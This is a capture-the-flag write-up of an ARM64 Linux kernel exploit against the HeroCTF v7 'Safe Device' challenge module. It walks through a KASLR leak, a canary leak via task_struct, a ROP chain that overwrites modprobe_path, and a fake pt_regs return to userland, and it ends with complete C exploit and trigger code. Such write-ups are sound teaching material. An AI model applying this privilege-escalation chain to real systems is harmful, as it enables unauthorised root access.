---
date: '2025-12-04T10:39:10+07:00'
draft: false
title: 'Kernel Exploitation in ARM Architecture (HeroCTF v7)'
---

A couple days ago, our team `CSUI` participated in [HeroCTF v7](https://ctftime.org/event/2869) and managed to secure 9th place at the end. One of the challenges there was `Safe Device`, a pwn challenge with the least solves, clocking in at 7 solves at the end of the event.

{{<figure src="images/challenge.png" width="400" class="align-center">}}

## Challenge Overview
[Download Challenge Files](safe_device_players.zip)

Extracting the challenge files and going into the `images` folder, we will find an `Image` and `rootfs.ext4` file. Running `file` on `Image` will reveal that it is of type `Linux kernel ARM64 boot executable Image`. Moreover, we will also find a `k.ko` file in the challenge files. We can make an educated guess that this is the module loaded in the challenge and also where the vulnerability lies.

We can confirm this by mounting the `rootfs.ext4` file with the command `sudo mount -o loop rootfs.ext4 mnt-rootfs/`. The startup scripts that run when you boot into a kernel challenge are usually found in `/etc/inittab` and the files in `/etc/init.d`. We can read the `/etc/init.d/rcS` to find the info we need.
```bash
$ cat rcS
#!/bin/sh

...

insmod /root/k.ko
sysctl -w kernel.dmesg_restrict=1
sysctl -w kernel.panic_on_oops=1
```
Alright, we've confirmed that the system does indeed load `k.ko` as a kernel module. So the next thing we need to do is decompile this module and search for any vulnerabilities.

## Debugging
Before we start analyzing the module, let's set up a debugging environment first. One of the nice things that we can do is to give ourselves root permissions locally. By being root, we can have access to helpful files such as `/proc/kallsyms` to find addresses. To do that, we can comment out this specific line in `/etc/inittab` and add a new line as such.
```bash
# Put a getty on the serial port
# console::respawn:/sbin/getty -L  console 0 vt100 # GENERIC_SERIAL
console::respawn:-/bin/sh
```
After that, we need to set up debugging using GDB. Since I'm on an x86 machine and the kernel image is on ARM, I needed to install `gdb-multiarch`. You can install that using apt.
```bash
sudo apt install gdb-multiarch
```
Once finished, we need to open up a listener port in the Qemu VM that'll let us attach GDB to it to debug the kernel. Thankfully, the `start-qemu.sh` script already has a way to add extra arguments when booting through the variable `EXTRA_ARGS`. So to open up a port for GDB to attach to, we can simply run the script with:
```bash
EXTRA_ARGS="-s" ./start-qemu.sh
```
Once finished, you should see that you now have root permissions locally and have access to important files.
```bash
$ EXTRA_ARGS="-s" ./start-qemu.sh
Seeding 256 bits and crediting
Saving 256 bits of creditable seed for next boot
Running sysctl: OK
Starting network: udhcpc: started, v1.37.0
udhcpc: broadcasting discover
udhcpc: broadcasting select for 10.0.2.15, server 10.0.2.2
udhcpc: lease of 10.0.2.15 obtained from 10.0.2.2, lease time 86400
deleting routers
adding dns 10.0.2.3
OK
Starting crond: OK
crond[99]: crond (busybox 1.37.0) started, log level 8

Starting dropbear sshd: OK
kernel.dmesg_restrict = 1
kernel.panic_on_oops = 1
# id
uid=0(root) gid=0(root)
#
```

Then, in another window, start the debugging session using GDB and point it to the `Image` file, then run the command `start remote :1234`.
```shell
$ gdb-multiarch Image
GNU gdb (Ubuntu 15.0.50.20240403-0ubuntu1) 15.0.50.20240403-git
Copyright (C) 2024 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 174 pwndbg commands and 46 shell commands. Type pwndbg [--shell | --all] [filter] for a list.
pwndbg: created $rebase, $base, $hex2ptr, $bn_sym, $bn_var, $bn_eval, $ida GDB functions (can be used with print/break)
Reading symbols from Image...
(No debugging symbols found in Image)
------- tip of the day (disable with set show-tips off) -------
Use GDB's dprintf command to print all calls to given function. E.g. dprintf malloc, "malloc(%p)\n", (void*)$rdi will print all malloc calls
pwndbg> target remote :1234
Remote debugging using :1234
0xffffbd5bf5281c74 in ?? ()
```
Alright, everything's all set up! We can move on to the actual module now.

## The `k.ko` Kernel Module
On load, the module creates a device file named `/dev/safe_device`. Some operations have been registered on that device, but the one we're interested in is the function handler for ioctl, which is named `safe_ioctl`. The function has two routes, one for the argument `0x80086B02` and one for `0x40086B03`.

### The `GET_MSG` Route
If you use `0x80086B02` for the ioctl operation, you'll go through the `GET_MSG` route. In this route, you can pass in any address and the kernel will read 8 bytes of it and write the value back to your original param.
```c
__int64 __fastcall safe_ioctl(__int64 a1, int ioctl_num, unsigned __int64 ioctl_param)
{
    __int64 result; // x0
    size_t v15; // x2
    __int64 addr_from_userland_2; // x1
    __int64 addr_from_userland; // [xsp+0h] [xbp-410h] BYREF
    ...

    if ( ioctl_num != 0x80086B02 )
    {
        // path not taken in this route
    }
    // safe_module: IOCTL_GET_MSG called.
    printk(&unk_8C0);
    ...
    v15 = _arch_copy_from_user(&addr_from_userland, ioctl_param & 0xFF7FFFFFFFFFFFFFLL, 8);
    ...
    addr_from_userland_2 = addr_from_userland;
    ...
    result = _arch_copy_to_user(ioctl_param & 0xFF7FFFFFFFFFFFFFLL, addr_from_userland_2, 8);
}
```
Essentially, this is an 8 byte arbitrary read. Very powerful primitive.

### The `SET_MSG` Route
If you use `0x40086B03` for the ioctl operation, you'll go through the `SET_MSG` route. In this route, the contents of the buffer you pass as the ioctl param will be copied over to a kernel variable `s`, then it'll call `safe_log(s)`.
```c
__int64 __fastcall safe_ioctl(__int64 a1, int ioctl_num, unsigned __int64 ioctl_param)
{
    __int64 result; // x0
    size_t v15; // x2
    _BYTE s[1024]; // [xsp+8h] [xbp-408h] BYREF

    ...

    memset(s, 0, sizeof(s));

    if ( ioctl_num != 0x80086B02 )
    {
        if ( ioctl_num != 0x40086B03 )
        {
            // operation not found
            result = -25;
            goto LABEL_4;
        }
        // safe_module: IOCTL_SET_MSG called.
        printk(&unk_727);
        ...
        {
            v15 = _arch_copy_from_user(s, ioctl_param & 0xFF7FFFFFFFFFFFFFLL, 1024);
            ...
            if ( !v15 )
            {
                safe_log(s);
                result = 0;
                goto LABEL_4;
            }
        }
        ...
    }
    ...
}
```

```c
__int64 __fastcall safe_log(void *src)
{
    __int64 result; // x0
    _BYTE dest[64]; // [xsp+8h] [xbp-48h] BYREF
    __int64 v3; // [xsp+48h] [xbp-8h]

    v3 = *(_QWORD *)(_ReadStatusReg(SP_EL0) + 632);
    memcpy(dest, src, 1024u);
    result = printk(&unk_95B);
    _ReadStatusReg(SP_EL0);
    return result;
}
```

A buffer overflow is present here. Firstly, our `ioctl_param`'s content is copied over into `s`. After that, in `safe_log`, the kernel allocates a `dest` buffer that's 64 bytes long. However, it then runs `memcpy(dest, src, 1024)` which is a clear overflow. This will be our entrypoint to perform ROP and exploit the kernel.

## Leaking Values
We cannot immediately send a ROP payload as there are a few problems, which are:
1. KASLR is on; and
2. Stack canary is on.

Let's tackle KASLR first to get the kernel base address.

### Bypassing KASLR
Since we have an 8 byte read primitive, all we need to do is find an address where its value is a kernel address and leak it. To do this, I turned my attention to ol' reliable, pwndbg's search function.

```
pwndbg> vmmap
             Start                End Perm     Size Offset File
...
0xffffbd5bf4a00000 0xffffbd5bf4a10000 r--p    10000      0 [pt_ffffbd5bf4a00]
0xffffbd5bf4a10000 0xffffbd5bf5290000 r-xp   880000      0 [pt_ffffbd5bf4a10]
0xffffbd5bf5290000 0xffffbd5bf54b0000 r--p   220000      0 [pt_ffffbd5bf5290]
...
```

Our goal is to find an address in memory which points to one of these three sections.
```
pwndbg> search --dword 0xffffbd5b
Searching for a 4-byte integer: b'[\xbd\xff\xff'
[pt_ffff000000200] 0xffff000000a90014 0xf53ba7c6ffffbd5b
...
pwndbg> x/gx 0xffff000000a90010
0xffff000000a90010:     0xffffbd5bf53ba7ba
pwndbg> vmmap 0xffffbd5bf53ba7ba
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File
0xffffbd5bf4a10000 0xffffbd5bf5290000 r-xp   880000      0 [pt_ffffbd5bf4a10]
►xffffbd5bf5290000 0xffffbd5bf54b0000 r--p   220000      0 [pt_ffffbd5bf5290] +0x12a7ba
0xffffbd5bf5680000 0xffffbd5bf5800000 rw-p   180000      0 [pt_ffffbd5bf5680]

[QEMU target detected - vmmap result might not be accurate; see `help vmmap`]
pwndbg>
```

We found our target, `0xffff000000a90010`. Interestingly, this address doesn't seem to be affected by KASLR. I've run this test multiple times and the address inside `0xffff000000a90010` always points to the kernel image everytime. I'm not quite sure why this happens, but hey, atleast we got our leak.

### Bypassing the Canary
This one is a bit tricker than getting the kernel base. I put a breakpoint in `safe_log` to see where the kernel was obtaining its canary from.
```nasm
   0xffffbd5b95c90200    sub    sp, sp, #0x60             SP => 0xffff800080223940 (0xffff8000802239a0 - 0x60)
   0xffffbd5b95c90204    stp    x29, x30, [sp, #0x50]
   0xffffbd5b95c90208    mrs    x8, sp_el0
 ► 0xffffbd5b95c9020c    add    x29, sp, #0x50            FP => 0xffff800080223990 (0xffff800080223940 + 0x50)
   0xffffbd5b95c90210    ldr    x8, [x8, #0x278]          X8, [0xffff000001b50278] => 0xf16b8d31cc4fae00
   0xffffbd5b95c90214    mov    x1, x0                    X1 => 0xffff8000802239a8 ◂— 0
   0xffffbd5b95c90218    add    x0, sp, #8                X0 => 0xffff800080223948 (0xffff800080223940 + 0x8)
   0xffffbd5b95c9021c    mov    w2, #0x400                W2 => 0x400
   0xffffbd5b95c90220    stur   x8, [x29, #-8]            [0xffff800080223988] <= 0xf16b8d31cc4fae00
```
The canary is stored in the `x8` register. For this particular run, the canary was obtained from the address `0xffff000001b50278`. However, this address was not constant. Very often this turned into a different address each time I rebooted the VM and reran my exploit. So leaking a constant address like how we did to leak the kernel base won't work here.

I noticed that the address was obtained by adding `0x278` to `0xffff000001b50000`. I had a hunch that that base address must store a bunch of other important values other than the canary. After some research, I found that the stack canary was stored in a struct called [`task_struct`](https://elixir.bootlin.com/linux/v6.17.7/source/include/linux/sched.h#L816) and after seeing how the `current` macro works on ARM64, my suspicions were confirmed.
```c
static __always_inline struct task_struct *get_current(void)
{
	unsigned long sp_el0;

	asm ("mrs %0, sp_el0" : "=r" (sp_el0));

	return (struct task_struct *)sp_el0;
}

#define current get_current()
```
This macro directly corresponds to the assembly code `mrs x8, sp_el0` you see above. To find if I could leak the current task_struct address, I did a search to see in what other places it appeared at. I figured that if the current `task_struct` address was different on every run, then the kernel must have written it somewhere in memory for it to be able to read it later. So, I focused my search in regions of memory after aren't just readable, but also writeable.

```
pwndbg> vmmap
             Start                End Perm     Size Offset File
0xffffbd5bf4a00000 0xffffbd5bf4a10000 r--p    10000      0 [pt_ffffbd5bf4a00]
0xffffbd5bf4a10000 0xffffbd5bf5290000 r-xp   880000      0 [pt_ffffbd5bf4a10]
0xffffbd5bf5290000 0xffffbd5bf54b0000 r--p   220000      0 [pt_ffffbd5bf5290]
0xffffbd5bf5680000 0xffffbd5bf5800000 rw-p   180000      0 [pt_ffffbd5bf5680]
...

pwndbg> search --dword 0x000001b5 [pt_ffffbd5bf5680]
Searching for a 4-byte integer: b'\xb5\x01\x00\x00'
[pt_ffffbd5bf5680] 0xffffbd5bf5683cba 0x3cf0ffff000001b5
[pt_ffffbd5bf5680] 0xffffbd5bf5683cd2 0x37c0ffff000001b5
[pt_ffffbd5bf5680] 0xffffbd5bf5683cea 0x3d50ffff000001b5
[pt_ffffbd5bf5680] 0xffffbd5bf569395a 0xffff000001b5
...

pwndbg> x/gx 0xffffbd5bf5693958
0xffffbd5bf5693958:     0xffff000001b50190
pwndbg> x/gx 0xffff000001b50190+0xe8
0xffff000001b50278:     0xf16b8d31cc4fae00
pwndbg>
```
After fidling around a bit, I found that the above address constantly contained an address that pointed to the current task struct. Since that region of memory wasn't contigous with the kernel's memory, I had to find another leak in kernel memory for that particular memory region.
```
pwndbg> search --dword 0xbd5bf568 [pt_ffffbd5bf5290]
Searching for a 4-byte integer: b'h\xf5[\xbd'
[pt_ffffbd5bf5290] 0xffffbd5bf5295c9a 0xd248ffffbd5bf568
...

pwndbg> x/gx 0xffffbd5bf5295c98
0xffffbd5bf5295c98:     0xffffbd5bf5689898
pwndbg> vmmap 0xffffbd5bf5689898
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File
0xffffbd5bf5290000 0xffffbd5bf54b0000 r--p   220000      0 [pt_ffffbd5bf5290]
►xffffbd5bf5680000 0xffffbd5bf5800000 rw-p   180000      0 [pt_ffffbd5bf5680] +0x9898
0xfffffdffc0000000 0xfffffdffc0200000 rw-p   200000      0 [pt_fffffdffc0000]

[QEMU target detected - vmmap result might not be accurate; see `help vmmap`]
pwndbg>
```
We got em. So the flow to leak the canary will be: Leak kbase -> Leak the rw region -> Leak task_struct -> Leak canary.

## Constructing the ROP Chain
Initially, I had plan to make a chain to execute `commit_creds(prepare_kernel_cred(0))`. However, I found out that on newer kernel versions, `prepare_kernel_cred(0)` doesn't return a pointer to root creds anymore. https://elixir.bootlin.com/linux/v6.17.7/source/kernel/cred.c#L579
```c
struct cred *prepare_kernel_cred(struct task_struct *daemon)
{
	const struct cred *old;
	struct cred *new;

	if (WARN_ON_ONCE(!daemon))
		return NULL;
    ...
}
```

### Overwriting `modprobe_path`
So, my next plan was to overwrite `modprobe_path`. For more information on how it works, you can check this awesome [article](https://theori.io/blog/reviving-the-modprobe-path-technique-overcoming-search-binary-handler-patch) talking about it. So, the next step is to find out where `modprobe_path` actually lives in memory. Initially, `modprobe_path` has the value of `/sbin/modprobe`, so I searched for that string in pwndbg.

```
pwndbg> search '/sbin/modprobe'
Searching for byte: b'/sbin/modprobe'
[pt_ffff000000cb0] 0xffff000000f139c8 '/sbin/modprobe'
```

I tested out if this is the actual `modprobe_path` address by manually overwriting it using pwndbg then triggering the modprobe exploit with the code in the above article. It was a success so it is confirmed that this is the right address. Another nice thing is that the address seems to be constant. After rebooting a couple times, the address always stayed in the same place so no need for anymore leaks.

### Finding Gadgets
Running `ROPgadget` normally on `Image` doesn't seem to work for me. So I ran it with the following command.
```bash
ROPgadget \
  --binary Image \
  --rawArch=arm64 \
  --rawMode=64 \
  --rawEndian=little > gadgets.txt
```
After searching around a bit, I landed on these 2 gadgets.
```nasm
0xffff9f83e503d0c0:  ldp     x19, x20, [sp, #32]
0xffff9f83e503d0c4:  ldp     x21, x22, [sp, #48]
0xffff9f83e503d0c8:  ldp     x23, x24, [sp, #64]
0xffff9f83e503d0cc:  ldp     x25, x26, [sp, #80]
0xffff9f83e503d0d0:  ldp     x27, x28, [sp, #96]
0xffff9f83e503d0d4:  ldp     x29, x30, [sp], #112
0xffff9f83e503d0d8:  ret
```
This gadget is for loading a bunch of controlled values into registers. Generally useful gadget for ROPs.
```nasm
0xffffa5d72f4aca28:  str     x20, [x22, #8]
0xffffa5d72f4aca2c:  ldp     x20, x19, [sp, #32]
0xffffa5d72f4aca30:  ldp     x22, x21, [sp, #16]
0xffffa5d72f4aca34:  ldp     x29, x30, [sp], #48
0xffffa5d72f4aca38:  autiasp
0xffffa5d72f4aca3c:  ret
```
This gadget is for writing to memory. We'll be using this to overwrite `modprobe_path`.

### Returning to Userland
After overwriting `modprobe_path`, we have to return to userland cleanly to be able to use our new modprobe string. If we just go to some random address after our ROP chain, we'll end up crashing the kernel and won't be able to do anything else. The usual `swapgs_restore_regs_and_return_to_usermode` function that you use to switch back to userland in x86 doesn't seem to be present in arm. So, I decided to see how syscalls actually flow in arm64. I created a simple assembly file then put a breakpoint at the first instruction.
```nasm
    .section .data
msg:
    .ascii  "hello\n"
msg_end:

    .section .text
    .global _start

_start:
    // write(1, msg, len)
    mov     x0, #1
    ldr     x1, =msg
    mov     x2, #msg_end - msg
    mov     x8, #64
    svc     #0

    // exit(0)
    mov     x0, #0
    mov     x8, #93
    svc     #0
```
After stepping into the syscall, which is `svc` in arm64, and stepping over a couple instructions. I found this particularly interesting passage.
```nasm
pwndbg> x/20i $pc
=> 0xffffbd5bf4a1142c:  stp     x0, x1, [sp]
   0xffffbd5bf4a11430:  stp     x2, x3, [sp, #16]
   0xffffbd5bf4a11434:  stp     x4, x5, [sp, #32]
   0xffffbd5bf4a11438:  stp     x6, x7, [sp, #48]
   0xffffbd5bf4a1143c:  stp     x8, x9, [sp, #64]
   0xffffbd5bf4a11440:  stp     x10, x11, [sp, #80]
   0xffffbd5bf4a11444:  stp     x12, x13, [sp, #96]
   0xffffbd5bf4a11448:  stp     x14, x15, [sp, #112]
   0xffffbd5bf4a1144c:  stp     x16, x17, [sp, #128]
   0xffffbd5bf4a11450:  stp     x18, x19, [sp, #144]
   0xffffbd5bf4a11454:  stp     x20, x21, [sp, #160]
   0xffffbd5bf4a11458:  stp     x22, x23, [sp, #176]
   0xffffbd5bf4a1145c:  stp     x24, x25, [sp, #192]
   0xffffbd5bf4a11460:  stp     x26, x27, [sp, #208]
   0xffffbd5bf4a11464:  stp     x28, x29, [sp, #224]
   0xffffbd5bf4a11468:  mov     x0, xzr
   0xffffbd5bf4a1146c:  mov     x1, xzr
   0xffffbd5bf4a11470:  mov     x2, xzr
   0xffffbd5bf4a11474:  mov     x3, xzr
   0xffffbd5bf4a11478:  mov     x4, xzr
```
This passage seems to be storing all the userland register values into the kernel stack. A pretty logical step for starting a syscall when switching to kernelland. After stepping through a couple more instructions, I find what seems to be the ending of the syscall.
```nasm
pwndbg> x/20i $pc
=> 0xffffbd5bf4a12234:  msr     elr_el1, x21
   0xffffbd5bf4a12238:  msr     spsr_el1, x22
   0xffffbd5bf4a1223c:  ldp     x0, x1, [sp]
   0xffffbd5bf4a12240:  ldp     x2, x3, [sp, #16]
   0xffffbd5bf4a12244:  ldp     x4, x5, [sp, #32]
   0xffffbd5bf4a12248:  ldp     x6, x7, [sp, #48]
   0xffffbd5bf4a1224c:  ldp     x8, x9, [sp, #64]
   0xffffbd5bf4a12250:  ldp     x10, x11, [sp, #80]
   0xffffbd5bf4a12254:  ldp     x12, x13, [sp, #96]
   0xffffbd5bf4a12258:  ldp     x14, x15, [sp, #112]
   0xffffbd5bf4a1225c:  ldp     x16, x17, [sp, #128]
   0xffffbd5bf4a12260:  ldp     x18, x19, [sp, #144]
   0xffffbd5bf4a12264:  ldp     x20, x21, [sp, #160]
   0xffffbd5bf4a12268:  ldp     x22, x23, [sp, #176]
   0xffffbd5bf4a1226c:  ldp     x24, x25, [sp, #192]
   0xffffbd5bf4a12270:  ldp     x26, x27, [sp, #208]
   0xffffbd5bf4a12274:  ldp     x28, x29, [sp, #224]
   0xffffbd5bf4a12278:  nop
   0xffffbd5bf4a1227c:  msr     far_el1, x29
   0xffffbd5bf4a12280:  adrp    x30, 0xffffbd5bf5576000
```
This passage seems to do the opposite of when we entered the syscall, i.e. it's popping back all the original userland values into their respective registers. This seems to be preparing to switch back to userland. After tracing back this execution, I found that it was reached through a branch instruction.
```nasm
   0xffffbd5bf4a115c4    b      #0xffffbd5bf4a121a0         <-73272332836448>

 ► 0xffffbd5bf4a121a0    ldr    x19, [x28]            X19, [0xffff000001a5e000] => 0
   0xffffbd5bf4a121a4  ✔ tbz    w19, #0x15, #0xffffbd5bf4a121b4 <-73272332836428>
    ↓
   0xffffbd5bf4a121b4    ldp    x21, x22, [sp, #0x100]
   0xffffbd5bf4a121b8    bl     #0xffffbd5bf4a1bfc0         <-73272332795968>

   0xffffbd5bf4a121bc    ldr    x23, [sp, #0xf8]
   0xffffbd5bf4a121c0    msr    sp_el0, x23
```
Searching for that address in `/proc/kallsyms` reveals that this is a function called `ret_to_user`. Very promising!
```shell
# grep ffffbd5bf4a121a0 /proc/kallsyms
ffffbd5bf4a121a0 t ret_to_user
```
You can find the source code [here](https://elixir.bootlin.com/linux/v6.17.7/source/arch/arm/kernel/entry-common.S#L104). After fidling around a bit, I found that the kernel uses a struct called `pt_regs` as a storage helper to switch around between user and kernel land. On entering a syscall, the kernel stores all register values from userland into that `pt_regs` struct. That's what you see happening at the start with all those `stp` instructions. At the end of a syscall, the kernel refers back to the same `pt_regs` struct to get back all the original register values before switching back to userland. That's what you see happening at the end with all those `ldp` instructions. Below is the definition of the `pt_regs` struct. You can see the full source [here](https://elixir.bootlin.com/linux/v6.17.7/source/arch/arm64/include/asm/ptrace.h#L156)
```c
struct pt_regs {
	union {
		struct user_pt_regs user_regs;
		struct {
			u64 regs[31];
			u64 sp;
			u64 pc;
			u64 pstate;
		};
	};
	u64 orig_x0;
	s32 syscallno;
	u32 pmr;

	u64 sdei_ttbr1;
	struct frame_record_meta stackframe;

	/* Only valid for some EL1 exceptions. */
	u64 lockdep_hardirqs;
	u64 exit_rcu;
};
```
This aligns perfectly with what we've been seeing in assembly! This struct stores all register values from `x0` all the way to `x30`. More importantly, it stores the `pc` register that the kernel will return to once it switches to userland! We finally found our target! This also aligns perfectly well with another thing that happens at the start of a syscall.
```nasm
pwndbg> x/5i 0xffffbd5bf4a10c04
   0xffffbd5bf4a10c04:  mrs     x30, tpidrro_el0
   0xffffbd5bf4a10c08:  msr     tpidrro_el0, xzr
   0xffffbd5bf4a10c0c:  sub     sp, sp, #0x150
   0xffffbd5bf4a10c10:  add     sp, sp, x0
   0xffffbd5bf4a10c14:  sub     x0, sp, x0
```
Notice how 0x150 is subtracted from `sp`. That number is the exact size of the `pt_regs` struct! So this is the kernel preparing space in the stack for a new `pt_regs` struct.

So now, after we've overwritten modprobe, we'll want to fake a `pt_regs` struct then jump to `ret_to_user` to cleanly switch back to userland. We'll set the `pc` register to an address in our exploit that'll call `exit(0)`. But since the struct also needs a valid `sp` register value, we'll have to save the current userland `sp` before we jump to kernelmode to execute our exploit. For the `pstate` register, I put a breakpoint again at `safe_log` and examined what the intended value was in `pt_regs`. After restarting a couple times, it seemed to be a constant value of `0x0000000080000000`.

## Conclusion
So, the things we did in this exploit are:
1. Found a constant address in memory to leak a kernel address, thus bypassing KASLR
2. Found that the canary is stored in an object called `task_struct` and searched around in memory for its address. The chain we used to leak it is: Leak kbase -> Leak read/write region -> Leak `task_struct` -> Leak canary
3. Constructed a ROP chain to overwrite `modprobe_path`
4. Found that the kernel has a function named `ret_to_user` that is called when the kernel is done executing a syscall and wants to switch back to userland.
5. Found that there's a struct called `pt_regs` that is used by the kernel to store register values when starting the execution of a syscall.
6. Most importantly, the `pt_regs` struct contains the value that the kernel will set the `pc` register to when switching to userland.
7. So, to end our ROP chain, we faked a `pt_regs` struct and jumped to `ret_to_user`.
8. The important values to fake in the `pt_regs` struct are
    - `pc` (address of where we want to go after switching back to userland)
    - `sp` (stack pointer address in userland, can be obtained by saving the sp before switching to kernelland)
    - `pstate` (some constant that you can copy from the original struct)

{{<figure src="images/result.png" width="800" class="align-center">}}

## Solver
### Overwrite Modprobe
```c{linenos=true}
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/if_alg.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/ioctl.h>

#define GET_MSG 0x80086B02
#define SET_MSG 0x40086B03

#define modprobe_path 0xffff000000f139c8

/*
   0xffff9f83e503d0c0:  ldp     x19, x20, [sp, #32]
   0xffff9f83e503d0c4:  ldp     x21, x22, [sp, #48]
   0xffff9f83e503d0c8:  ldp     x23, x24, [sp, #64]
   0xffff9f83e503d0cc:  ldp     x25, x26, [sp, #80]
   0xffff9f83e503d0d0:  ldp     x27, x28, [sp, #96]
   0xffff9f83e503d0d4:  ldp     x29, x30, [sp], #112
   0xffff9f83e503d0d8:  ret
*/
#define ld_regs (kbase + 0x000000000003d0c0)

/*
   0xffffa5d72f4aca28:  str     x20, [x22, #8]
   0xffffa5d72f4aca2c:  ldp     x20, x19, [sp, #32]
   0xffffa5d72f4aca30:  ldp     x22, x21, [sp, #16]
   0xffffa5d72f4aca34:  ldp     x29, x30, [sp], #48
   0xffffa5d72f4aca38:  autiasp
   0xffffa5d72f4aca3c:  ret
*/
#define str_val (kbase + 0x00000000002aca28)

int fd;
size_t kbase;
size_t ret_to_user;
size_t canary;
size_t user_sp;

int get_msg(void *addr) {
    return ioctl(fd, GET_MSG, addr);
}

int set_msg(void *msg) {
    return ioctl(fd, SET_MSG, msg);
}

void save_state(void) {
    asm volatile(
        "mov %0, sp\n"
        : "=r" (user_sp)   // output: any GP register
        :                  // no inputs
        : "memory"         // clobber (conservative)
    );
}

void leak_kbase(void) {
    size_t leak = 0xffff000000a90010;
    int retval = get_msg(&leak);
    printf("leak = 0x%lx\n", leak);
    printf("retval = 0x%x\n", retval);

    kbase = leak - 0x9ba7ba;
    ret_to_user = leak - 0x9a861a;
    printf("kbase = 0x%lx\n", kbase);
    printf("ret_to_user = 0x%lx\n", ret_to_user);
}

void leak_canary(void) {
    size_t bss_leak = kbase + 0x895c98;
    printf("bss_leak_before = 0x%lx\n", bss_leak);
    get_msg(&bss_leak);
    size_t bss_base = bss_leak - 0x9898;
    printf("bss_leak = 0x%lx\n", bss_leak);
    printf("bss_base = 0x%lx\n", bss_base);

    size_t cur_task_leak = bss_base + 0x13958;
    get_msg(&cur_task_leak);
    printf("cur_task_page = 0x%lx\n", cur_task_leak);

    canary = cur_task_leak + 0xe8;
    get_msg(&canary);
    printf("canary = 0x%lx\n", canary);
}

void exit_rop(void) {
    exit(0);
}

void overwrite_modprobe(void) {
    save_state();
    unsigned long payload[128];
    memset(payload, 0, sizeof(payload));
    payload[8] = canary;
    payload[10] = ld_regs;
    payload[12] = str_val;
    payload[16] = 0x782f706d742f; // /tmp/x
    payload[18] = modprobe_path - 0x8;
    payload[24] = kbase;
    payload[26] = ret_to_user + 0x14;

    // idx 31 is start of pt_regs struct
    payload[31 + 31] = user_sp;
    payload[31 + 32] = (unsigned long)exit_rop;
    payload[31 + 33] = 0x0000000080000000;

    set_msg(payload);
}

int main(void) {
    fd = open("/dev/safe_device", 0);

    leak_kbase();
    leak_canary();
    overwrite_modprobe();

    close(fd);
    return 0;
}
```
### Trigger Modprobe
```c{linenos=true}
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/if_alg.h>
#include <fcntl.h>
#include <sys/mman.h>

int main(void) {
    struct sockaddr_alg sa;

    puts("making exploit file...");

    system("echo -e '#!/bin/sh\ncat /root/flag.txt > /tmp/flag.txt' > /tmp/x");
    system("chmod +x /tmp/x");

    puts("should be done");

    int alg_fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (alg_fd < 0) {
            perror("socket(AF_ALG) failed");
            return 1;
    }

    memset(&sa, 0, sizeof(sa));
    sa.salg_family = AF_ALG;
    strcpy((char *)sa.salg_type, "V4bel");  // dummy string
    bind(alg_fd, (struct sockaddr *)&sa, sizeof(sa));

    return 0;
}
```